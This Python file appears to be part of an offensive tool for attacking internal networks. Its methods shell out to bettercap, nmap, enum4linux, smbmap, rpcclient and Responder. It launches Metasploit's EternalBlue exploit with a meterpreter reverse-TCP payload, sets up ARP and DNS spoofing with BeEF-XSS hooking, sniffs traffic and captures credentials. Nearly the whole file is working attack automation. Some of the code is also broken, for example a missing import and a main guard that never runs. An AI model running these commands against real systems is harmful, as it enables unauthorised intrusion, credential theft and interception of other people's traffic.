import sys
import time
import subprocess
from src.core.banner import *
from src.core.bcolors import *

class Interna_Attack(object):
    def __init__(self, host):
        self.host = host
    os.system("echo '1' > /proc/sys/net/ipv4/ip_forward 2> /dev/null")
    def bettercap_discover(self):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|       † Bettercap Has Began Discovering Live Hosts In The Network †          |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
        time.sleep(0.03)
        beauty.saviour_banner()
        print('\n')
        process = subprocess.Popen("bettercap -eval 'set $ {bold}r0jahsm0ntar1 [Type.Exit.When.Ready] » {reset}; net.recon on; net.probe on; ticker on'", shell = True).wait()
        return process
    def nmap_pscanner(self, host):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|          † Nmap Has Began Discovering All Open Ports On †                    |
+------------------------------------------------------------------------------+ """ + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        time.sleep(0.03)
        process = subprocess.Popen("nmap -v -p- {0}".format(host), shell = True).wait()
        return process
    def nmap_vulnscanner(self, host):
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|          † Nmap Has Began Default SCript Scanning On †                       |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("nmap -sV -sC -v -p- {0}".format(host), shell = True).wait()
        return process
    def smb_enumuration(self, host):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|          † Nmap Has Begun Scanning For OPen Ports On †                       |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("nmap -v -p- {0}".format(host), shell = True).wait()
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|          † Scanning For SMB VulnerBilities With Nmap On †                    |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("nmap -v -p 139,445 --script smb-vuln* {0}".format(host), shell = True).wait()
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|          † Reconning For All Internal SMB Informaion On †                    |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("enum4linux -a {0}".format(host), shell = True).wait()
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|            † Trying To Connect Using Null User & Password On †               |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("smbmap -H {0} -u null -p null -r --depth 5".format(host), shell = True).wait()
        return process

    def smb_exploit(self, host):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|            † Launching EternalBlue & Password Bruteforcer On †               |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("nmap -sV -v -p 445 --script=smb-vuln-ms17-010 {0}".format(host), shell = True).wait()
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|            † BruteForcing SMB Password  With [Cme & mp64] On †               |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("nmap -sV -v -p 445 smb-brute.nse {0}".format(host), shell = True).wait()
        time.sleep(0.03)
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|            † Launching RpcClient With Null Pass & User. On †                 |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
        """.format(host) + bcolors.ENDC)
        process = subprocess.Popen("rpcclient -U '' -N {0}".format(host), shell = True).wait()
        while True:
            try:
                print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|                †  Launch EternalBlue Exploit Againist  †                     |
+------------------------------------------------------------------------------+
|              Type   1.) for Yes   0.) for No & Back To Main                  |
+------------------------------------------------------------------------------+
""".format(host) + bcolors.ENDC)
                choice = input(bcolors.GREEN + "                   [africana] > [target] = [{0}]: ".format(host) + bcolors.ENDC)
                if choice == '1':
                    try:
                        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|              † Launching Metasploit EternalBlue ExpLploit †                  |
+------------------------------------------------------------------------------+""" + bcolors.ENDC)
                        print(bcolors.GREEN + """                   [africana] [attacking] > [{0}]
                        """.format(host) + bcolors.ENDC)
                        process = subprocess.Popen("msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {0}; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 8443; set VERBOSE true; exploit'".format(host), shell = True).wait()
                        return process
                    except:
                        break
                elif choice == '0':
                    break
                else:
                    os.system('clear')
                    print(bcolors.RED + """
                                                                                
+------------------------------------------------------------------------------+
|    † Poor Choice Of Selection. Select [0-2] Exiting. GoodLuck Next Time †    |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
                    time.sleep(3)
                    os.system('clear')
                    break
            except KeyboardInterrupt:
                break
    def packets_sniffer(self, host):
        while True:
            try:
                beauty.volture_banner()
                print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|         † Welcome To Bettercap's Packet Sniffer With (https) Module †        |
+------------------------------------------------------------------------------+
| Type   1. for Target      2. All Internall IPS        0. Back To Main        |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
                choice = input(bcolors.GREEN + "[africana] > [target] = [{0}]: ".format(host) + bcolors.ENDC)
                os.system('clear')
                if choice == '1':
                    beauty.bear_a_banner()
                    print('\n')
                    return subprocess.Popen("bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'"%(host), shell = True).wait()
                    return process
                elif choice == '2':
                    beauty.bear_a_banner()
                    print('\n')
                    process = subprocess.Popen("bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'", shell = True).wait()
                    return process
                elif choice == '0':
                    break
                else:
                    os.system('clear')
                    print(bcolors.RED + """
                                                                                
+------------------------------------------------------------------------------+
|    † Poor Choice Of Selection. Select [0-2] Exiting. GoodLuck Next Time †    |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
                    time.sleep(3)
                    os.system('clear')
                    break
            except KeyboardInterrupt:
                os.system('clear')
                break
    def beefxss_bettercap(self, host):
        while True:
            try:
                beauty.volture_banner()
                print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|         † Welcome To Bettercap's Packet Injector With BEEF-XSS Tool  †       |
+------------------------------------------------------------------------------+
| Type  1. for Chosen Target   2. All Internall IPS    0. Back To Main         |
+------------------------------------------------------------------------------+
""".format(host) + bcolors.ENDC)
                choice = input(bcolors.GREEN + "[africana] > [target] = [{0}]: ".format(host) + bcolors.ENDC)
                os.system('clear')
                if choice == '1':
                    beauty.bear_a_banner()
                    a = subprocess.Popen("systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open 'http://127.0.0.1:3000/ui/panel' 2>/dev/null &" , shell = True).wait()
                    f = subprocess.Popen("bettercap -eval 'set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset};set arp.spoof.targets %s; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on'; systemctl stop beef-xss.service"%(host), shell = True).wait()
                    return a, f
                elif choice == '2':
                    beauty.volture_banner()
                    r =  subprocess.Popen("systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; xdg-open 'http://127.0.0.1:3000/ui/panel' 2>/dev/null &" , shell = True).wait()
                    i = subprocess.Popen("systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; bettercap -eval 'set $ {bold}r0jahsm0ntar1 [Jesus.Loves.You] » {reset}; set arp.spoof on; set net.sniff.verbose true; net.sniff on; set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn,*amazon.com; dns.spoof on; ticker on'; systemctl stop beef-xss.service", shell = True).wait()
                    return r, i
                elif choice == '0':
                    break
                else:
                    os.system('clear')
                    print(bcolors.RED + """
                                                                                
+------------------------------------------------------------------------------+
|    † Poor Choice Of Selection. Select [0-2] Exiting. GoodLuck Next Time †    |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
                    time.sleep(3)
                    os.system('clear')
                    break
            except KeyboardInterrupt:
                break

    def packets_responder(self):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|              † Launching Responder Againist All Internal Hosts †             |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
        process = subprocess.Popen("responder -I eth0 -wbDFP" , shell = True).wait()
        return process
    def packets_wireshark(self):
        print(bcolors.BLUE + """
+------------------------------------------------------------------------------+
|              † Launching wireshark Againist All Internal Hosts †             |
+------------------------------------------------------------------------------+
""" + bcolors.ENDC)
        process = subprocess.Popen("wireshark" , shell = True).wait()
        return process

internal_scanner = Interna_Attack(host = '')
if ' __name__' == '__main__':
        sys.exit(internal_scanner())
